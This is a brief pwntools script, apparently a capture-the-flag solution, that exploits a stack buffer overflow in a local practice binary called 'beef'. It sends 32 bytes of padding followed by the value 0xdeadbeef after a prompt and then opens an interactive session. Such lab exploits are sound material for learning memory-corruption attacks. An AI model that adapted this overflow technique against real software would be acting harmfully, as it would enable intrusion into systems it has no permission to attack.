from pwn import *
exe = './beef'
p = process(exe)
context.log_level = 'DEBUG'
padding = 32
# payload = (
#     b'A' * padding,
#     p64(0x44434241)
# )
payload = b'A' * padding + p64(0xdeadbeef)
p.recvuntil(b'organization')
p.recvline()
p.sendline(payload)
p.interactive()